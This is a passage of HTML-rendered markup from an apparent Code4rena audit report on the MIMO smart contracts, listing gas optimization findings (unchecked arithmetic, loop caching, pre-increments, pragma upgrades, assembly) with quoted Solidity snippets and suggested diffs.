rebalance(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">61:     address vaultOwner = vaultsData.vaultOwner(rbData.vaultId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 65:     _takeFlashLoan(flData, abi.encode(vaultsData.vaultOwner(rbData.vaultId), managerFee, rbData, swapData));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 65:     _takeFlashLoan(flData, abi.encode(vaultOwner, managerFee, rbData, swapData));</span></span></span></code></pre>\n<h2 id=\"g-06-unchecking-arithmetics-operations-that-cant-underflowoverflow\" style=\"position:relative;\"><a href=\"#g-06-unchecking-arithmetics-operations-that-cant-underflowoverflow\" aria-label=\"g 06 unchecking arithmetics operations that cant underflowoverflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Unchecking arithmetics operations that can’t underflow/overflow</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an <code>unchecked</code> block: <a href=\"https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic\">https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic</a></p>\n<p>Consider wrapping with an <code>unchecked</code> block here (around <strong>25 gas saved</strong> per instance):</p>\n<ul>\n<li>File: <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/automated/MIMOAutoAction.sol#L97-L101\">MIMOAutoAction.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">097</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">swapResultValue</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rebalanceValue</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">098</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">099</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"97\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultVariation</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">rebalanceValue</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">swapResultValue</span><span class=\"mtk1\">).</span><span class=\"mtk11\">wadDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rebalanceValue</span><span class=\"mtk1\">); </span></span></span></code></pre>\n<ul>\n<li>File: <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/managed/MIMOManagedAction.sol#L120-L124\">MIMOManagedAction.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">swapResultValue</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rebalanceValue</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"120\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultVariation</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">rebalanceValue</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">swapResultValue</span><span class=\"mtk1\">).</span><span class=\"mtk11\">wadDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rebalanceValue</span><span class=\"mtk1\">); </span></span></span></code></pre>\n<ul>\n<li>File: <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/MIMOLeverage.sol#L132-L133\">MIMOLeverage.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collateralBalanceAfter</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"132\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">core</span><span class=\"mtk1\">), </span><span class=\"mtk12\">collateralBalanceAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">); </span></span></span></code></pre>\n<h2 id=\"g-07-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" style=\"position:relative;\"><a href=\"#g-07-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" aria-label=\"g 07 arraylength should not be looked up in every loop of a for loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for-loop</code></h2>\n<p><strong>Note : This is describing an optimization that the sponsor already chose to ignore, to be thorough: <a href=\"https://github.com/code-423n4/2022-08-mimo/tree/main/docs/#for-loop-syntax\">https://github.com/code-423n4/2022-08-mimo/tree/main/docs/#for-loop-syntax</a></strong></p>\n<p>Reading array length at each iteration of the loop consumes more gas than necessary.</p>\n<p>In the best case scenario (length read on a memory variable), caching the array length in the stack saves around <strong>3 gas</strong> per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.</p>\n<p>Here, consider storing the array’s length in a variable before the for-loop, and use this new variable instead:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">132</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<h2 id=\"g-08-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1\" style=\"position:relative;\"><a href=\"#g-08-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1\" aria-label=\"g 08 i costs less gas compared to i or i  1 same for   i vs i   or i   1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] <code>++i</code> costs less gas compared to <code>i++</code> or <code>i += 1</code> (same for <code>--i</code> vs <code>i--</code> or <code>i -= 1</code>)</h2>\n<p>Pre-increments and pre-decrements are cheaper.</p>\n<p>For a <code>uint256 i</code> variable, the following is true with the Optimizer enabled at 10k:</p>\n<p><strong>Increment:</strong></p>\n<ul>\n<li><code>i += 1</code> is the most expensive form</li>\n<li><code>i++</code> costs 6 gas less than <code>i += 1</code></li>\n<li><code>++i</code> costs 5 gas less than <code>i++</code> (11 gas less than <code>i += 1</code>)</li>\n</ul>\n<p><strong>Decrement:</strong></p>\n<ul>\n<li><code>i -= 1</code> is the most expensive form</li>\n<li><code>i--</code> costs 11 gas less than <code>i -= 1</code></li>\n<li><code>--i</code> costs 5 gas less than <code>i--</code> (16 gas less than <code>i -= 1</code>)</li>\n</ul>\n<p>Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name <em>post-increment</em>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">j</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++, </span><span class=\"mtk8\">&quot;This will be false as i is incremented after the comparison&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, pre-increments (or pre-decrements) return the new value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">j</span><span class=\"mtk1\"> == ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;This will be true as i is incremented before the comparison&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the pre-increment case, the compiler has to create a temporary variable (when used) for returning <code>1</code> instead of <code>2</code>.</p>\n<p>Affected code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">132</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).</p>\n<h2 id=\"g-09-incrementsdecrements-can-be-unchecked-in-for-loops\" style=\"position:relative;\"><a href=\"#g-09-incrementsdecrements-can-be-unchecked-in-for-loops\" aria-label=\"g 09 incrementsdecrements can be unchecked in for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Increments/decrements can be unchecked in for-loops</h2>\n<p><strong>Note : This is describing an optimization that the sponsor already chose to ignore, to be thorough: <a href=\"https://github.com/code-423n4/2022-08-mimo/tree/main/docs/#for-loop-syntax\">https://github.com/code-423n4/2022-08-mimo/tree/main/docs/#for-loop-syntax</a></strong></p>\n<p>In Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.</p>\n<p><a href=\"https://github.com/ethereum/solidity/issues/10695\">ethereum/solidity#10695</a></p>\n<p>Consider wrapping with an <code>unchecked</code> block here (around <strong>25 gas saved</strong> per instance):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">132</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>The change would be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- for (uint256 i; i &lt; numIterations; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ for (uint256 i; i &lt; numIterations;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> // ...  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}  </span></span></span></code></pre>\n<p>The same can be applied with decrements (which should use <code>break</code> when <code>i == 0</code>).</p>\n<p>The risk of overflow is non-existent for <code>uint256</code> here.</p>\n<h2 id=\"g-10-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied\" style=\"position:relative;\"><a href=\"#g-10-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied\" aria-label=\"g 10 it costs more gas to initialize variables with their default value than letting the default value be applied permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] It costs more gas to initialize variables with their default value than letting the default value be applied.</h2>\n<p>If a variable is not set/initialized, it is assumed to have the default value (<code>0</code> for <code>uint</code>, <code>false</code> for <code>bool</code>, <code>address(0)</code> for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas (around <strong>3 gas</strong> per instance).</p>\n<p>Affected code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">132</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>Consider removing explicit initializations for default values.</p>\n<h2 id=\"g-11-upgrade-pragma\" style=\"position:relative;\"><a href=\"#g-11-upgrade-pragma\" aria-label=\"g 11 upgrade pragma permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Upgrade pragma</h2>\n<p>Using newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.</p>\n<p>The advantages here are:</p>\n<ul>\n<li><strong>Contract existence checks</strong> (>= 0.8.10): external calls skip contract existence checks if the external call has a return value</li>\n</ul>\n<p>Consider upgrading here :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">2</span><span class=\"mtk1\">:</span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxyFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">2</span><span class=\"mtk1\">:</span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">2</span><span class=\"mtk1\">:</span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-12-optimizations-with-assembly\" style=\"position:relative;\"><a href=\"#g-12-optimizations-with-assembly\" aria-label=\"g 12 optimizations with assembly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] Optimizations with assembly</h2>\n<p>The original warden who proved these type of findings is 0xKitsune. Clone the repo <a href=\"https://github.com/0xKitsune/gas-lab\">0xKitsune/gas-lab</a>, copy/paste the contract examples and run <code>forge test --gas-report</code> to replicate the gas reports with the optimizer turned on and set to 10000 runs.</p>\n<p><em>(For in-depth details on each of the following sub-sections, see the warden’s <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/74\">full report</a>.)</em></p>\n<h3 id=\"121-use-assembly-for-math-add-sub-mul-div\" style=\"position:relative;\"><a href=\"#121-use-assembly-for-math-add-sub-mul-div\" aria-label=\"121 use assembly for math add sub mul div permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>12.1. Use assembly for math (add, sub, mul, div)</h3>\n<p>Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions &#x3C; 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.</p>\n<h3 id=\"122-use-assembly-to-check-for-address0\" style=\"position:relative;\"><a href=\"#122-use-assembly-to-check-for-address0\" aria-label=\"122 use assembly to check for address0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>12.2. Use assembly to check for address(0)</h3>\n<h3 id=\"123-use-assembly-to-write-storage-values\" style=\"position:relative;\"><a href=\"#123-use-assembly-to-write-storage-values\" aria-label=\"123 use assembly to write storage values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 